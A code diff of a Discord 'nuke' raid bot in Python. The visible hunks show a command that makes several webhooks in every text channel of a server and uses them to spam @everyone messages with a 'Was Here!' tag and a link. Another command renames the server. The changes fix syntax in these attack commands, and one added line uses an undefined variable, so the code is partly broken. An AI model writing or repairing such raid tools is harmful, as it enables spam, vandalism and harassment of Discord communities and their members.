@@ -80,7 +80,7 @@ async def nuke(ctx):
     for channel in ctx.guild.text_channels:
         num_webhooks = 5  # change this to the # of webhooks you want
         for _ in range(num_webhooks):
-            webhook = await channel.create_webhook(name=f"ISOPA.XIII}")
+            webhook = await channel.create_webhook(name=f"ISOPA.XIII")
             for _ in range(5):
                 await webhook.send(
                     f"@everyone **isopa.XIII Was Here!** https://guns.lol/isopa.x/"
@@ -133,7 +133,7 @@ async def guildname(ctx, *, newname):
     """
     await ctx.message.delete()
     await ctx.guild.edit(name=newname)
-    await ctx.send(f"Changed the server name to {ISOPA.XIII IS HERE}")
+    await channel.send("ISOPA.XIII IS HERE")
 
 
 @bot.command()
@@ -257,5 +257,5 @@ async def removegive(ctx):
         await ctx.send("An error occurred while processing the command.")
 
 
-token = "BOT TOKEN"
+token = "BOT_TOKEN"
 bot.run(token)
